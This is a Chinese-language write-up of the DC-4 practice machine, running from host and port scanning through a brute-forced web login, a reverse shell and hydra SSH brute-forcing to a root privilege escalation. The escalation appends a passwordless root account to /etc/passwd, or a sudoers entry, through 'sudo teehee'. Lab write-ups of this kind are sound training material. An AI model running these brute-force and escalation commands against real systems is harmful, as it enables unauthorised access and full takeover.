# DC-4

## 主机扫描

```
arp-scan -l
```

> 靶机ip：192.168.56.110

## 端口扫描

```
nmap -A 192.168.56.110
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-15 07:08 EDT
Nmap scan report for 192.168.56.110
Host is up (0.0011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-title: System Tools
|_http-server-header: nginx/1.15.10
MAC Address: 08:00:27:8A:84:D7 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 目录扫描

```
dirsearch -u http://192.168.56.110
```

```
Target: http://192.168.56.110/

[07:12:12] Starting: 
[07:12:40] 302 -  704B  - /command.php  ->  index.php
[07:12:42] 301 -  170B  - /css  ->  http://192.168.56.110/css/
[07:12:52] 301 -  170B  - /images  ->  http://192.168.56.110/images/
[07:12:52] 403 -  556B  - /images/
[07:12:52] 403 -   15B  - /index.pHp
[07:12:57] 302 -  206B  - /login.php  ->  index.php
[07:12:58] 302 -  163B  - /logout.php  ->  index.php
```

## 访问web页面

### 爆破登录页面

![image-20240315191803905](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315191803905.png)

> admin happy

进到后台，发现可以执行命令

直接反弹shell

![image-20240315192253431](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315192253431.png)

查找suid权限的文件

```
www-data@dc-4:/home$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
/bin/ping
```

这里exim4是有漏洞的，和dc-8的一样

我这里跟着靶机思路再做一遍

进到home目录

```shell
www-data@dc-4:/home/jim$ ls -la
ls -la
total 36
drwxr-xr-x 3 jim  jim  4096 Mar 12 21:37 .
drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
-rw------- 1 jim  jim   528 Apr  6  2019 mbox
-rwxrwxrwx 1 jim  jim    22 Mar 12 21:25 test.sh
```

发现密码文件

```shell
www-data@dc-4:/home/jim$ cd backups
cd backups
www-data@dc-4:/home/jim/backups$ ls
ls
old-passwords.bak
```

可能是jim的密码

### 爆破SSH

```
hydra -l jim -P pass.txt ssh://192.168.56.110
```

```
[22][ssh] host: 192.168.56.110   login: jim   password: jibril04
```



```shell
jim@dc-4:~$ cat mbox
cat mbox
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
        (envelope-from <root@dc-4>)
        id 1hCiQe-0000gc-EC
        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.
```

## 提权

```shell
jim@dc-4:~$ cd /var/mail
cd /var/mail
jim@dc-4:/var/mail$ ls
ls
jim  www-data
jim@dc-4:/var/mail$ cat jim
cat jim
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
        (envelope-from <charles@dc-4>)
        id 1hCjIX-0000kO-Qt
        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles

jim@dc-4:/var/mail$ sudo -l
sudo -l
[sudo] password for jim: ^xHhA&hvim0y

Sorry, try again.
[sudo] password for jim: jibril04

Sorry, user jim may not run sudo on dc-4.
```

> 得到Charles的登录密码，^xHhA&hvim0y

```shell
charles@dc-4:~$ sudo -l
sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

可以用teehee命令

看一下teehee的手册

> 用法：teehee [选项] ... [文件] ...
>
> 将标准输入复制到每个FILE，也复制到标准输出。
>
> -a、 --附加到给定的FILEs，不覆盖
>
> -i、 --忽略中断忽略中断信号
>
> -p诊断写入非管道的错误

利用管道写进文件

可以写/etc/passwd或者/etc/sudoers

```
echo "root1::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
su - root1
```

或者

```
echo "charles   ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers
sudo su -
```

![image-20240315195417005](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315195417005.png)

## 总结

> 主要考察爆破，ssh爆破，登录页面爆破
>
> 靶机涉及知识点：
>
> 爆破，teeheee提权，/etc/passwd，/etc/sudoers文件利用

